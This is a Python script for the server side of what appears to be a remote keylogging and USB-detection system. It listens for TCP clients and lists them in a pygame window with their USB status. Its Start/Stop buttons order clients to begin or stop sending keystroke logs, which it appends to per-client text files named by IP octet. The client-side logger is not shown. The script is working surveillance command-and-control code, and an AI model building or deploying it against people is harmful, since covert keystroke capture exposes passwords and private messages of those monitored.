import pygame as g
import socket
from threading import *
import sys
import pygbutton as but

def find(addr):
    global adlist
    global chcklst
    for i in range(len(adlist)):
        if adlist[i] == addr:
            return i
    return None


def wait(server):
    while True:
        client,addr = server.accept()
        th = Thread(target=start,args=[client,addr])
        th.start()

def start(client,addr):
    global adlist
    global chcklst
    global base_path
    global butlist
    path = ""
    i = len(butlist)
    butlist.append(but.PygButton(rect=g.Rect(400,(21*i),50,17),caption='Start'))
    #Creating Log file path for each client with last octet of IP as file name
    path = base_path + (addr[0].split('.')[3]) + ".txt"
    adlist.append(addr)
    chcklst.append(0)
    clients.append(client)
    #Listening to Messages from Client
    while True:
        msg = client.recv(10)
        msg = msg.decode()
        print(msg)
        #USB Detected
        if msg == "USB":
            i = find(addr)
            chcklst[i] = 1
        #Client first notifies that it is about to send LOG
        elif msg == "LOG":
            log = client.recv(1024)
            log = log.decode()
            f = open(path,'a')
            f.write(log)
            f.close()
            

g.init()
screen = g.display.set_mode((640,480))

bg = g.Surface(screen.get_size())
bg = bg.convert()
bg.fill((255,255,255))

f = g.font.SysFont("Comic Sans MS",15)

#adlist maintains list of all Clients Connected
adlist = []
#chcklst is a list of flags indicating if USB has been detected or not
chcklst = []
#butlist is a list of Keylog Buttons
butlist = []
#List Of Client Sockets
clients = []
#Base Path to store Keylog file
base_path = "C:\\Users\\Sony\\Desktop\\Mehmood\\Python\\"

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((socket.gethostname(),12345))
server.listen(10)

th = Thread(target=wait,args=[server])
th.start()

clk = g.time.Clock()
flag = True

while flag:
    clk.tick(10)
    for event in g.event.get():
        if event.type == g.QUIT:
          sys.exit()
        if event.type == g.MOUSEBUTTONDOWN:
            pos = g.mouse.get_pos()
            for i in range(len(butlist)):
                if butlist[i]._propGetRect().collidepoint(pos):
                    if butlist[i]._propGetCaption() == "Start":
                        butlist[i]._propSetCaption("Stop")
                        clients[i].send("LOG".encode('Ascii'))
                    else:
                        butlist[i]._propSetCaption("Start")
                        clients[i].send("STOP".encode('Ascii'))
    screen.blit(bg,(0,0))
    for i in range(len(adlist)):
        label = f.render(adlist[i][0]+":"+str(adlist[i][1]),1,(0,0,0))
        screen.blit(label,(0,20*i))
        if chcklst[i] == 0:
            status = f.render("Connected!",1,(0,255,0))
        else:
            status = f.render("USB Detected!",1,(255,0,0))
        screen.blit(status,(150,20*i))
        butlist[i].draw(screen)
    g.display.flip()
